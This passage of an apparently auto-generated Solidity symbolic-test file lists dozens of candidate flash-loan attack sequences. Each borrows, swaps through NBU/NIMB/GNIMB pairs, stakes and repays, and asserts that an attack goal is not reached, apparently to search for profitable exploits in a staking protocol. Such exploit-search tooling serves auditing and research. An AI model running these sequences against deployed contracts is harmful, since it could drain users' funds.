        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2904(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2905(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2906(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2907(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2908(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2909(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2910(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2911(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2912(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2913(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2914(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2915(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2916(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2917(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2918(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2919(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2920(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2921(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2922(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2923(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2924(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2925(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2926(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2927(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2928(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2929(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2930(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2931(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2932(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2933(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2934(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2935(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2936(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2937(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2938(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2939(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2940(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2941(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2942(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2943(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2944(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2945(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2946(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2947(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2948(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2949(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2950(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2951(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
